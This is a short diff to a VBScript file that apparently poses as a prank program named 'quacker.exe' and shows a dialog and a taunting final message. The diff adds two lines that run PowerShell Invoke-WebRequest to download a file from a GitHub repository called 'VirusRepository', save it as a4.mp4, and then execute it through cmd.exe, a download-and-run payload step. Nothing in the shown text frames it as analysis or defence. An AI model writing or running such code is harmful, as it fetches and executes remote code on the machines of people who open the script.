@@ -33,6 +33,8 @@ If intAnswer = vbYes Then
         
         ' Final message
         MsgBox "draw with the last seconds with your pc", vbOk, "quacker.exe"
+        oShell.Run "cmd.exe /C powershell -Command Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/a.mp4 -Outfile a4.mp4"
+        oShell.Run "cmd.exe /C a4.mp4"
     Else
         WScript.Quit
     End If
